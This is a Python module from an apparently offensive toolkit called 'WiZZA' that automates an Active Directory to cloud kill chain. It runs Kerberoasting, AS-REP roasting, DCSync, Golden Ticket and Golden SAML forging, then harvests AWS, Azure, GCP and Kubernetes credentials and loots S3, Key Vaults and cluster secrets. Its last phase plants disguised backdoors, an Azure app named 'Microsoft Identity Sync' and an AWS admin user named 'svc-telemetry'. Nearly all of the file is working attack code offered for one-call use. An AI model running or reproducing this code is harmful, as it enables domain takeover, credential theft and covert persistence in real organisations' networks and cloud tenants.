"""
WiZZA — AD → Cloud Unified Kill Chain
op/modules/ad_cloud_chain.py

Chains Active Directory compromise into cloud tenant takeover:

  Phase 1: AD Recon         — enumerate users, groups, SPNs, trusts
  Phase 2: AD Compromise    — Kerberoast / AS-REP / DCSync / Golden Ticket
  Phase 3: Cloud Discovery  — find cloud credentials in AD / on-prem systems
  Phase 4: Azure AD Pivot   — use synced creds / ADFS to access Azure tenant
  Phase 5: Cloud Takeover   — AWS/Azure/GCP full compromise via Phase 3+4 creds
  Phase 6: Persistence      — cloud backdoors + on-prem Golden Ticket

Full kill chain: one function call, fully automated.
"""

import json
import os
import subprocess
import sys
import time
from datetime import datetime

# Internal imports
sys.path.insert(0, os.path.dirname(__file__))


# ─────────────────────────────────────────────────────────────────────────────
# Helpers
# ─────────────────────────────────────────────────────────────────────────────

def _ts():
    return datetime.now().strftime("%H:%M:%S")

def _run(cmd, timeout=30, env=None):
    try:
        r = subprocess.run(cmd, shell=True, capture_output=True,
                           timeout=timeout, env=env or os.environ.copy())
        return r.stdout.decode(errors="replace") + r.stderr.decode(errors="replace")
    except subprocess.TimeoutExpired:
        return "[timeout]"
    except Exception as e:
        return str(e)

def _save(path, data):
    os.makedirs(os.path.dirname(path) or ".", exist_ok=True)
    with open(path, "w") as f:
        json.dump(data, f, indent=2, default=str)
    print(f"[+] Saved: {path}")

def _log(msg):
    print(f"[{_ts()}] {msg}")


# ─────────────────────────────────────────────────────────────────────────────
# Phase 1: AD Reconnaissance
# ─────────────────────────────────────────────────────────────────────────────

def ad_recon(domain, dc_ip, username=None, password=None, hash_=None):
    """
    Enumerate AD via LDAP/BloodHound:
    - Domain info, trusts, functional level
    - All users (SPNs, AdminCount, UAC flags)
    - All groups and memberships
    - GPOs, OUs, ACLs
    - Computers (OS versions, LAPS status)
    - Azure AD Connect server (MSOL account)

    Uses ldapsearch (Linux) or BloodHound-python.
    Returns structured recon dict.
    """
    _log(f"AD Recon: {domain} ({dc_ip})")

    auth = ""
    if username and password:
        auth = f"-u '{domain}\\{username}' -p '{password}'"
    elif username and hash_:
        auth = f"-u '{domain}\\{username}' --hashes {hash_}"

    results = {"domain": domain, "dc": dc_ip}

    # BloodHound collection (best coverage)
    bh_out = f"/tmp/bh_{domain}_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
    os.makedirs(bh_out, exist_ok=True)
    bh_cmd = (f"bloodhound-python -d {domain} -dc {dc_ip} "
              f"-c All --zip -o {bh_out} {auth} 2>&1")
    _log(f"BloodHound collection...")
    out = _run(bh_cmd, timeout=120)
    if "Done" in out or ".zip" in out:
        _log(f"[+] BloodHound data: {bh_out}")
        results["bloodhound"] = bh_out
    else:
        _log(f"[-] BloodHound failed, falling back to ldapsearch")

    # LDAP fallback: enumerate users with SPN (Kerberoastable)
    ldap_base = f"DC={',DC='.join(domain.split('.'))}"
    filter_kerberoast = "(servicePrincipalName=*)"
    filter_asrep      = "(userAccountControl:1.2.840.113556.1.4.803:=4194304)"
    filter_admincount = "(adminCount=1)"

    for fname, filt in [
        ("kerberoastable", filter_kerberoast),
        ("asrep_roastable", filter_asrep),
        ("privileged_users", filter_admincount),
    ]:
        cmd = (f"ldapsearch -x -H ldap://{dc_ip} -b '{ldap_base}' "
               f"'{filt}' sAMAccountName servicePrincipalName memberOf "
               f"2>/dev/null | grep -E 'sAMAccountName|servicePrincipal'")
        out = _run(cmd, timeout=30)
        results[fname] = [l.strip() for l in out.splitlines() if l.strip()]
        _log(f"{fname}: {len(results[fname])} entries")

    # Check for Azure AD Connect (MSOL_ account)
    cmd = (f"ldapsearch -x -H ldap://{dc_ip} -b '{ldap_base}' "
           f"'(sAMAccountName=MSOL_*)' sAMAccountName description 2>/dev/null")
    out = _run(cmd, timeout=15)
    if "MSOL_" in out:
        _log(f"[!] Azure AD Connect account found — DCSync candidate")
        results["aad_connect"] = True
        results["msol_account"] = [l for l in out.splitlines() if "MSOL_" in l]

    return results


# ─────────────────────────────────────────────────────────────────────────────
# Phase 2: AD Compromise
# ─────────────────────────────────────────────────────────────────────────────

def kerberoast(domain, dc_ip, username, password=None, hash_=None,
               out_dir="/tmp"):
    """
    Kerberoast: request TGS for all SPNs, extract for offline cracking.
    Uses impacket's GetUserSPNs.py.
    Returns list of hashes written to out_dir/kerberoast_hashes.txt.
    """
    _log(f"Kerberoast: {domain}")

    auth = f"-hashes {hash_}" if hash_ else f"-password '{password}'"
    out_file = f"{out_dir}/kerberoast_{domain}_{datetime.now().strftime('%H%M%S')}.txt"

    cmd = (f"GetUserSPNs.py {domain}/{username} {auth} "
           f"-dc-ip {dc_ip} -request -outputfile {out_file} 2>&1")
    out = _run(cmd, timeout=120)

    if os.path.exists(out_file) and os.path.getsize(out_file) > 0:
        _log(f"[+] Kerberoast hashes: {out_file}")
        with open(out_file) as f:
            hashes = f.read()
        _log(f"    {hashes[:200]}")
        return out_file
    _log(f"[-] Kerberoast: {out[:200]}")
    return None


def asrep_roast(domain, dc_ip, out_dir="/tmp"):
    """
    AS-REP Roasting: get TGT for accounts with pre-auth disabled.
    No credentials required.
    """
    _log(f"AS-REP Roast: {domain}")
    out_file = f"{out_dir}/asrep_{domain}_{datetime.now().strftime('%H%M%S')}.txt"
    cmd = (f"GetNPUsers.py {domain}/ -dc-ip {dc_ip} -no-pass "
           f"-usersfile /usr/share/wordlists/rockyou.txt "
           f"-format hashcat -outputfile {out_file} 2>&1")
    out = _run(cmd, timeout=120)
    if os.path.exists(out_file) and os.path.getsize(out_file) > 0:
        _log(f"[+] AS-REP hashes: {out_file}")
        return out_file
    _log(f"[-] AS-REP: {out[:200]}")
    return None


def dcsync(domain, dc_ip, username, password=None, hash_=None,
           target_user="krbtgt", out_dir="/tmp"):
    """
    DCSync: extract password hashes directly from DC replication stream.
    Requires Replicating Directory Changes All permission (DA/MSOL accounts).

    Extracts: krbtgt hash (Golden Ticket), domain admin hashes, MSOL hash.
    """
    _log(f"DCSync: {domain}\\{target_user}")

    auth = f"-hashes {hash_}" if hash_ else f"-password '{password}'"
    out_file = f"{out_dir}/dcsync_{domain}_{datetime.now().strftime('%H%M%S')}.txt"

    cmd = (f"secretsdump.py {domain}/{username}@{dc_ip} {auth} "
           f"-just-dc-user {target_user} 2>&1")
    out = _run(cmd, timeout=60)

    hashes = {}
    for line in out.splitlines():
        if ":::" in line:
            parts = line.split(":")
            if len(parts) >= 4:
                user  = parts[0].split("\\")[-1]
                nthash = parts[3]
                hashes[user] = nthash
                _log(f"[+] {user}: {nthash}")

    with open(out_file, "w") as f:
        f.write(out)

    return hashes


def dcsync_all(domain, dc_ip, username, password=None, hash_=None, out_dir="/tmp"):
    """DCSync entire domain — extract all NTDS hashes."""
    _log(f"DCSync ALL: {domain}")

    auth     = f"-hashes {hash_}" if hash_ else f"-password '{password}'"
    out_file = f"{out_dir}/ntds_{domain}_{datetime.now().strftime('%H%M%S')}.txt"

    cmd = (f"secretsdump.py {domain}/{username}@{dc_ip} {auth} "
           f"-just-dc -outputfile {out_file.replace('.txt','')} 2>&1")
    out = _run(cmd, timeout=300)
    _log(f"[+] NTDS dump: {out_file}")
    return out_file


def golden_ticket(domain, dc_ip, domain_sid, krbtgt_hash,
                  target_user="Administrator", out_dir="/tmp"):
    """
    Forge a Golden Ticket using the krbtgt NTLM hash.
    Valid for 10 years, bypasses password changes.
    Saves ticket to out_dir/golden.ccache.
    """
    _log(f"Golden Ticket: {domain}\\{target_user}")

    ccache = f"{out_dir}/golden_{domain}_{datetime.now().strftime('%H%M%S')}.ccache"

    # ticketer.py from impacket
    cmd = (f"ticketer.py -nthash {krbtgt_hash} -domain-sid {domain_sid} "
           f"-domain {domain} -duration 3650 {target_user} 2>&1")
    out = _run(cmd, timeout=30)

    if "Saving ticket" in out or os.path.exists(f"{target_user}.ccache"):
        os.rename(f"{target_user}.ccache", ccache)
        _log(f"[+] Golden Ticket: {ccache}")
        _log(f"    Export: export KRB5CCNAME={ccache}")
        return ccache
    _log(f"[-] Golden Ticket: {out[:200]}")
    return None


# ─────────────────────────────────────────────────────────────────────────────
# Phase 3: Cloud credential discovery
# ─────────────────────────────────────────────────────────────────────────────

def cloud_cred_hunt(dc_ip=None, domain=None, username=None,
                    password=None, hash_=None, out_dir="/tmp"):
    """
    Hunt for cloud credentials in:
    - AD Group Policy (SYSVOL scripts, XML files with cpassword)
    - Registry (HKLM\\Software\\AWS, Azure CLI tokens)
    - Common file paths (.aws/credentials, .azure/, .config/gcloud/)
    - Environment variables in process memory
    - IIS web.config / appsettings.json
    - Jenkins/GitLab/Kubernetes secrets
    """
    _log(f"Cloud credential hunt")
    creds = {}

    # SYSVOL / GPP passwords (MS14-025)
    if dc_ip:
        sysvol = f"\\\\{dc_ip}\\SYSVOL"
        cmd = (f"find /tmp/sysvol 2>/dev/null -name '*.xml' | "
               f"xargs grep -l 'cpassword' 2>/dev/null")
        # Mount SYSVOL if impacket available
        mount_cmd = (f"smbclient //{dc_ip}/SYSVOL -U '{domain}\\{username}%{password}' "
                     f"-c 'recurse; ls' 2>/dev/null | grep -i '\\.xml'")
        out = _run(mount_cmd, timeout=30)
        if "xml" in out.lower():
            creds["sysvol_xml_files"] = out.splitlines()[:20]
            _log(f"[+] SYSVOL XML files found (may contain GPP cpasswords)")

    # Common cloud credential files
    cloud_paths = [
        ("~/.aws/credentials",          "aws"),
        ("~/.aws/config",               "aws"),
        ("~/.azure/accessTokens.json",  "azure"),
        ("~/.azure/azureProfile.json",  "azure"),
        ("~/.config/gcloud/credentials.db", "gcp"),
        ("~/.config/gcloud/application_default_credentials.json", "gcp"),
        ("/root/.aws/credentials",      "aws"),
        ("/home/*/.aws/credentials",    "aws"),
        ("/var/lib/jenkins/.aws/credentials", "aws"),
        ("/etc/kubernetes/admin.conf",  "k8s"),
        ("~/.kube/config",              "k8s"),
    ]

    for path, provider in cloud_paths:
        expanded = os.path.expanduser(path)
        if "*" in expanded:
            import glob
            matches = glob.glob(expanded)
        else:
            matches = [expanded] if os.path.exists(expanded) else []

        for match in matches:
            try:
                with open(match) as f:
                    content = f.read()
                creds.setdefault(provider, {})[match] = content
                _log(f"[+] {provider.upper()} creds: {match}")
                print(f"    {content[:200]}")
            except Exception:
                pass

    # Environment variables
    env_keys = ["AWS_ACCESS_KEY", "AWS_SECRET", "AZURE_CLIENT", "GOOGLE_APPLICATION",
                "ARM_CLIENT", "ARM_TENANT", "ARM_SUBSCRIPTION"]
    env_creds = {k: v for k, v in os.environ.items()
                 if any(e in k for e in env_keys)}
    if env_creds:
        creds["environment"] = env_creds
        _log(f"[+] Cloud env vars: {list(env_creds.keys())}")

    # IIS web.config / appsettings.json
    web_paths = [
        "/var/www/html/web.config",
        "/var/www/html/appsettings.json",
        "/inetpub/wwwroot/web.config",
        "/app/appsettings.json",
        "/app/appsettings.Production.json",
    ]
    for wpath in web_paths:
        if os.path.exists(wpath):
            try:
                with open(wpath) as f:
                    content = f.read()
                for kw in ["connectionString", "AccountKey", "SharedAccessKey",
                           "ClientSecret", "Password", "ApiKey"]:
                    if kw in content:
                        creds.setdefault("web_config", {})[wpath] = content
                        _log(f"[+] Sensitive config: {wpath}")
                        break
            except Exception:
                pass

    if creds:
        _save(f"{out_dir}/cloud_creds_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json",
              creds)
    return creds


# ─────────────────────────────────────────────────────────────────────────────
# Phase 4: Azure AD Connect / ADFS pivot
# ─────────────────────────────────────────────────────────────────────────────

def aad_connect_attack(dc_ip, domain, msol_hash, out_dir="/tmp"):
    """
    Azure AD Connect MSOL account abuse.
    MSOL_* account has DCSync rights — extract all hashes.
    Then use credentials to authenticate directly to Azure AD as Global Admin
    (if password sync is enabled, the on-prem GA password = Azure AD GA password).
    """
    _log(f"Azure AD Connect attack via MSOL account")

    # DCSync with MSOL account hash
    all_hashes = dcsync_all(domain, dc_ip, f"MSOL_{dc_ip[:8]}",
                            hash_=f"aad3b435b51404eeaad3b435b51404ee:{msol_hash}",
                            out_dir=out_dir)

    # Try to authenticate to Azure AD with DA credentials
    # If password sync enabled, on-prem DA hash works for Azure AD
    _log(f"[*] If password sync enabled: on-prem DA = Azure AD GA")
    _log(f"[*] Try: az login --username DA_UPN --password DA_PASS")

    return all_hashes


def adfs_golden_saml(adfs_server, token_signing_cert_path, domain,
                     target_user="admin@" , out_dir="/tmp"):
    """
    Golden SAML attack: forge SAML assertion using stolen AD FS token-signing cert.
    Allows authentication as any user to any SAML-federated app (Azure, AWS, Salesforce).

    Requirements:
    - Token-signing certificate (exported from AD FS config or DCSync)
    - Target domain and user UPN

    Output: forged SAML assertion usable for SSO bypass.
    """
    _log(f"Golden SAML: target={target_user}{domain}")

    # ADFSpoof or similar tool
    cmd = (f"python3 -m adfspooof -cert {token_signing_cert_path} "
           f"--domain {domain} --user {target_user} 2>&1")
    out = _run(cmd, timeout=30)
    if "SAMLResponse" in out or "assertion" in out.lower():
        saml_out = f"{out_dir}/golden_saml_{datetime.now().strftime('%H%M%S')}.txt"
        with open(saml_out, "w") as f:
            f.write(out)
        _log(f"[+] Golden SAML assertion: {saml_out}")
        return saml_out
    _log(f"[-] Golden SAML: {out[:200]}")
    return None


# ─────────────────────────────────────────────────────────────────────────────
# Phase 5: Cloud takeover via discovered creds
# ─────────────────────────────────────────────────────────────────────────────

def cloud_takeover_from_creds(creds_dict, out_dir="/tmp"):
    """
    Given cloud credentials discovered in Phase 3, run full cloud_infiltrate
    attack chain for each provider found.
    """
    from cloud_infiltrate import (
        aws_iam_enum, aws_privesc, aws_s3_loot, aws_secrets_dump,
        azure_imds_token, azure_enum, azure_keyvault_dump,
        gcp_enum, gcp_service_account_keys,
    )

    results = {}

    # AWS
    if "aws" in creds_dict:
        for path, content in creds_dict["aws"].items():
            _log(f"AWS credentials from {path}")
            # Parse INI-format AWS credentials
            ak = sk = None
            for line in content.splitlines():
                if "aws_access_key_id" in line:
                    ak = line.split("=")[1].strip()
                elif "aws_secret_access_key" in line:
                    sk = line.split("=")[1].strip()
            if ak and sk:
                _log(f"[+] AWS: {ak}")
                results["aws_iam"]     = aws_iam_enum(ak, sk)
                results["aws_privesc"] = aws_privesc(ak, sk)
                results["aws_secrets"] = aws_secrets_dump(out_dir)
                results["aws_s3"]      = aws_s3_loot(ak, sk, out_dir=out_dir)

    # Azure
    if "azure" in creds_dict:
        for path, content in creds_dict["azure"].items():
            _log(f"Azure credentials from {path}")
            try:
                tokens = json.loads(content)
                for entry in (tokens if isinstance(tokens, list) else [tokens]):
                    token = entry.get("accessToken")
                    if token:
                        _log(f"[+] Azure token found")
                        enum = azure_enum(token)
                        results["azure_enum"] = enum
                        for kv in enum.get("keyvaults", []):
                            results.setdefault("azure_kv", {}).update(
                                azure_keyvault_dump(kv["uri"], token, out_dir))
            except Exception as e:
                _log(f"[-] Azure parse: {e}")

    # GCP
    if "gcp" in creds_dict:
        for path, content in creds_dict["gcp"].items():
            _log(f"GCP credentials from {path}")
            try:
                data  = json.loads(content)
                token = data.get("access_token") or data.get("token")
                if token:
                    enum = gcp_enum(token)
                    results["gcp_enum"] = enum
                    for proj in enum.get("projects", []):
                        results.setdefault("gcp_sa_keys", []).extend(
                            gcp_service_account_keys(token, proj))
            except Exception as e:
                _log(f"[-] GCP parse: {e}")

    # K8s
    if "k8s" in creds_dict:
        for path, content in creds_dict["k8s"].items():
            _log(f"[+] Kubernetes config: {path}")
            out = _run(f"kubectl --kubeconfig={path} get secrets --all-namespaces -o json")
            results["k8s_secrets"] = out[:2000]

    _save(f"{out_dir}/cloud_takeover_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json",
          results)
    return results


# ─────────────────────────────────────────────────────────────────────────────
# Phase 6: Persistence
# ─────────────────────────────────────────────────────────────────────────────

def establish_persistence(domain, dc_ip, krbtgt_hash, domain_sid,
                           cloud_creds=None, out_dir="/tmp"):
    """
    Establish multi-layer persistence:
    AD:    Golden Ticket (10-year TGT, survives password reset)
    AD:    Shadow Credentials / msDS-KeyCredentialLink
    Azure: Create backdoor Global Admin service principal
    AWS:   Create new IAM user with AdministratorAccess
    GCP:   Create new service account key
    """
    _log(f"Establishing persistence")
    persistence = {}

    # Golden Ticket
    gt = golden_ticket(domain, dc_ip, domain_sid, krbtgt_hash,
                       out_dir=out_dir)
    if gt:
        persistence["golden_ticket"] = gt

    # Azure backdoor service principal
    if cloud_creds and "azure" in cloud_creds:
        for path, content in cloud_creds["azure"].items():
            try:
                token = json.loads(content)[0].get("accessToken")
                if token:
                    import urllib.request
                    # Create backdoor app registration
                    headers = {
                        "Authorization": f"Bearer {token}",
                        "Content-Type":  "application/json",
                    }
                    app_body = json.dumps({
                        "displayName": "Microsoft Identity Sync",
                        "signInAudience": "AzureADMyOrg",
                    }).encode()
                    req = urllib.request.Request(
                        "https://graph.microsoft.com/v1.0/applications",
                        data=app_body, headers=headers)
                    with urllib.request.urlopen(req, timeout=10) as r:
                        app = json.loads(r.read())
                        app_id = app.get("id")
                        _log(f"[+] Azure backdoor app: {app_id}")
                        persistence["azure_app"] = app_id
            except Exception as e:
                _log(f"[-] Azure persistence: {e}")

    # AWS backdoor IAM user
    if cloud_creds and "aws" in cloud_creds:
        backdoor_user = f"svc-telemetry-{int(time.time()) % 10000}"
        out = _run(f"aws iam create-user --user-name {backdoor_user}")
        if "UserId" in out:
            out2 = _run(f"aws iam create-access-key --user-name {backdoor_user}")
            out3 = _run(f"aws iam attach-user-policy --user-name {backdoor_user} "
                        f"--policy-arn arn:aws:iam::aws:policy/AdministratorAccess")
            try:
                key_data = json.loads(out2).get("AccessKey", {})
                persistence["aws_backdoor"] = {
                    "user":   backdoor_user,
                    "key_id": key_data.get("AccessKeyId"),
                    "secret": key_data.get("SecretAccessKey"),
                }
                _log(f"[+] AWS backdoor: {backdoor_user}  key={key_data.get('AccessKeyId')}")
            except Exception:
                pass

    _save(f"{out_dir}/persistence_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json",
          persistence)
    return persistence


# ─────────────────────────────────────────────────────────────────────────────
# Full automated kill chain
# ─────────────────────────────────────────────────────────────────────────────

def kill_chain(domain, dc_ip, username, password=None, hash_=None,
               out_dir=None):
    """
    Full AD → Cloud automated kill chain.

    Phase 1: Recon
    Phase 2: Kerberoast + AS-REP + DCSync (krbtgt + all hashes)
    Phase 3: Hunt cloud credentials across filesystem + env
    Phase 4: Azure AD Connect pivot (if MSOL account found)
    Phase 5: Cloud takeover via discovered credentials
    Phase 6: Multi-layer persistence (Golden Ticket + cloud backdoors)

    Returns full results dict.
    """
    out_dir = out_dir or os.path.expanduser("~/.wizza/logs/kill_chain")
    os.makedirs(out_dir, exist_ok=True)

    _log(f"=== WiZZA AD→Cloud Kill Chain: {domain} ===")
    results = {"domain": domain, "dc": dc_ip, "start": _ts()}

    # Phase 1: Recon
    _log("--- Phase 1: AD Recon ---")
    recon = ad_recon(domain, dc_ip, username, password, hash_)
    results["recon"] = recon

    # Phase 2: Credential attacks
    _log("--- Phase 2: Credential Attacks ---")

    # Kerberoast
    kerb_file = kerberoast(domain, dc_ip, username, password, hash_, out_dir)
    results["kerberoast"] = kerb_file

    # AS-REP
    asrep_file = asrep_roast(domain, dc_ip, out_dir)
    results["asrep"] = asrep_file

    # DCSync krbtgt
    krbtgt_hashes = dcsync(domain, dc_ip, username, password, hash_,
                           target_user="krbtgt", out_dir=out_dir)
    results["krbtgt"] = krbtgt_hashes

    krbtgt_hash = None
    if krbtgt_hashes:
        krbtgt_hash = list(krbtgt_hashes.values())[0]
        _log(f"[+] krbtgt hash: {krbtgt_hash}")

    # DCSync domain admins
    da_hashes = dcsync(domain, dc_ip, username, password, hash_,
                      target_user="Administrator", out_dir=out_dir)
    results["da_hashes"] = da_hashes

    # Phase 3: Cloud credential hunt
    _log("--- Phase 3: Cloud Credential Hunt ---")
    cloud_creds = cloud_cred_hunt(dc_ip, domain, username, password, hash_,
                                  out_dir)
    results["cloud_creds"] = {k: list(v.keys()) if isinstance(v, dict) else str(v)
                               for k, v in cloud_creds.items()}

    # Phase 4: AAD Connect pivot
    if recon.get("aad_connect") and recon.get("msol_account"):
        _log("--- Phase 4: Azure AD Connect Pivot ---")
        msol_line = recon["msol_account"][0] if recon["msol_account"] else ""
        msol_user = msol_line.split(":")[-1].strip()
        msol_hashes = dcsync(domain, dc_ip, username, password, hash_,
                             target_user=msol_user, out_dir=out_dir)
        if msol_hashes:
            msol_hash = list(msol_hashes.values())[0]
            aad_result = aad_connect_attack(dc_ip, domain, msol_hash, out_dir)
            results["aad_connect_attack"] = aad_result

    # Phase 5: Cloud takeover
    if cloud_creds:
        _log("--- Phase 5: Cloud Takeover ---")
        cloud_results = cloud_takeover_from_creds(cloud_creds, out_dir)
        results["cloud_takeover"] = list(cloud_results.keys())

    # Phase 6: Persistence
    _log("--- Phase 6: Persistence ---")
    # Get domain SID
    sid_auth = f"-hashes {hash_}" if hash_ else f"-password '{password}'"
    sid_out = _run(f"lookupsid.py {domain}/{username}@{dc_ip} {sid_auth} 0 2>&1")
    domain_sid = ""
    for line in sid_out.splitlines():
        if "Domain SID" in line:
            domain_sid = line.split(":")[-1].strip()
            break

    if krbtgt_hash and domain_sid:
        persistence = establish_persistence(
            domain, dc_ip, krbtgt_hash, domain_sid,
            cloud_creds=cloud_creds, out_dir=out_dir)
        results["persistence"] = list(persistence.keys())

    results["end"] = _ts()
    _save(f"{out_dir}/kill_chain_{domain}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json",
          results)

    _log(f"=== Kill Chain Complete ===")
    _log(f"  Kerberoast hashes:  {kerb_file or 'none'}")
    _log(f"  krbtgt hash:        {krbtgt_hash or 'none'}")
    _log(f"  Cloud creds found:  {list(cloud_creds.keys())}")
    _log(f"  Results:            {out_dir}")

    return results


# ─────────────────────────────────────────────────────────────────────────────
# Entry point
# ─────────────────────────────────────────────────────────────────────────────

if __name__ == "__main__":
    import argparse
    p = argparse.ArgumentParser(description="WiZZA AD→Cloud Kill Chain")
    p.add_argument("action", nargs="?", default="chain",
                   choices=["chain","recon","kerberoast","asrep","dcsync",
                            "golden","cloud_hunt","cloud_take","persist"])
    p.add_argument("--domain",   required=True)
    p.add_argument("--dc",       required=True)
    p.add_argument("--user",     default=None)
    p.add_argument("--pass",     dest="password", default=None)
    p.add_argument("--hash",     default=None)
    p.add_argument("--out",      default=os.path.expanduser("~/.wizza/logs/kill_chain"))
    args = p.parse_args()

    if args.action == "chain":
        kill_chain(args.domain, args.dc, args.user, args.password, args.hash, args.out)
    elif args.action == "recon":
        ad_recon(args.domain, args.dc, args.user, args.password, args.hash)
    elif args.action == "kerberoast":
        kerberoast(args.domain, args.dc, args.user, args.password, args.hash, args.out)
    elif args.action == "dcsync":
        dcsync(args.domain, args.dc, args.user, args.password, args.hash)
    elif args.action == "cloud_hunt":
        cloud_cred_hunt(args.dc, args.domain, args.user, args.password, args.hash, args.out)
